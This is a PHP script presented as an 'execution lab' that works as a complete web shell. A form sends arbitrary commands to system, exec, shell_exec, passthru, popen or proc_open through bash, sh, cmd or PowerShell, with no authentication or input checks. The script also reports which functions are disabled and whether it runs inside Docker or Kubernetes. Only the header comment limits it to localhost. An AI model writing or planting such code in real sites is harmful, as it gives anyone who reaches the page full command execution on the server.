<?php
/*
   ADVANCED EXECUTION LAB
   Run ONLY on localhost
*/

function box($text) {
    echo "<div style='background:#000;color:#00ff00;padding:15px;
          margin-top:10px;white-space:pre-wrap;border-radius:5px;'>";
    echo htmlspecialchars($text);
    echo "</div>";
}
    // Detect if current machine is docker
function isDocker() {
    // Check /.dockerenv file
    if (file_exists('/.dockerenv')) return true;

    // Check cgroup for docker or kubepods
    if (is_readable('/proc/1/cgroup')) {
        $cgroup = file_get_contents('/proc/1/cgroup');
        if (strpos($cgroup, 'docker') !== false || strpos($cgroup, 'kubepods') !== false) {
            return true;
        }
    }

    // Optional: overlay filesystem detection
    $mounts = shell_exec('mount');
    if (strpos($mounts, 'overlay') !== false) return true;

    return false;
}

if (isDocker()) {
    echo "⚠️ Running inside Docker";
} else {
    echo "Not running inside Docker";
}

// docker code end

$currentOS = PHP_OS_FAMILY;
$disabled = ini_get("disable_functions");

echo "<h1>🔥 Advanced PHP Execution Lab</h1>";
echo "<b>Detected OS:</b> $currentOS <br>";
echo "<b>Disabled Functions:</b> " . ($disabled ?: "None") . "<hr>";

if ($_SERVER['REQUEST_METHOD'] === 'POST') {

    $method = $_POST['method'];
    $shell  = $_POST['shell'];
    $cmd    = $_POST['cmd'];

    // Wrap command depending on selected shell
    switch ($shell) {
        case "bash":
            $cmd = "bash -c \"$cmd\"";
            break;
        case "sh":
            $cmd = "sh -c \"$cmd\"";
            break;
        case "cmd":
            $cmd = "cmd /c $cmd";
            break;
        case "powershell":
            $cmd = "powershell -Command \"$cmd\"";
            break;
    }

    echo "<h3>Execution Result:</h3>";

    if (strpos($disabled, $method) !== false) {
        box("Function '$method' is disabled in php.ini");
        exit;
    }

    switch ($method) {

        case "system":
            ob_start();
            system($cmd);
            $output = ob_get_clean();
            box($output ?: "No output");
            break;

        case "exec":
            $output = [];
            exec($cmd . " 2>&1", $output);
            box(implode("\n", $output) ?: "No output");
            break;

        case "shell_exec":
            $output = shell_exec($cmd . " 2>&1");
            box($output ?: "No output");
            break;

        case "passthru":
            ob_start();
            passthru($cmd);
            $output = ob_get_clean();
            box($output ?: "No output");
            break;

        case "popen":
            $handle = popen($cmd . " 2>&1", "r");
            $output = stream_get_contents($handle);
            pclose($handle);
            box($output ?: "No output");
            break;

        case "proc_open":
            $descriptorspec = [
                0 => ["pipe", "r"],
                1 => ["pipe", "w"],
                2 => ["pipe", "w"]
            ];
            $process = proc_open($cmd, $descriptorspec, $pipes);
            if (is_resource($process)) {
                $output = stream_get_contents($pipes[1]);
                $error  = stream_get_contents($pipes[2]);
                fclose($pipes[1]);
                fclose($pipes[2]);
                proc_close($process);
                box(($output . $error) ?: "No output");
            } else {
                box("proc_open failed");
            }
            break;
    }

    echo "<br><a href='advanced_execution_lab.php'>⬅ Back</a>";
    exit;
}
?>

<h2>🧪 Test Execution Methods</h2>

<form method="POST">

    <label><b>Select Execution Method:</b></label><br>
    <select name="method">
        <option value="system">system()</option>
        <option value="exec">exec()</option>
        <option value="shell_exec">shell_exec()</option>
        <option value="passthru">passthru()</option>
        <option value="popen">popen()</option>
        <option value="proc_open">proc_open()</option>
    </select>

    <br><br>

    <label><b>Select Shell:</b></label><br>
    <select name="shell">
        <option value="bash">bash (Linux)</option>
        <option value="sh">sh (Linux)</option>
        <option value="cmd">cmd (Windows)</option>
        <option value="powershell">PowerShell (Windows)</option>
    </select>

    <br><br>

    <label><b>Command:</b></label><br>
    <input type="text" name="cmd" style="width:500px;"
           placeholder="whoami">

    <br><br>
    <button type="submit">Execute</button>

</form>

<hr>

<h3>💡 Suggested Test Commands</h3>

<b>Linux (bash/sh):</b>
<pre>
whoami
id
pwd
ls -la
uname -a
</pre>

<b>Windows (cmd):</b>
<pre>
whoami
dir
echo %username%
ver
</pre>

<b>PowerShell:</b>
<pre>
whoami
Get-Process
Get-ChildItem
$PSVersionTable
</pre>
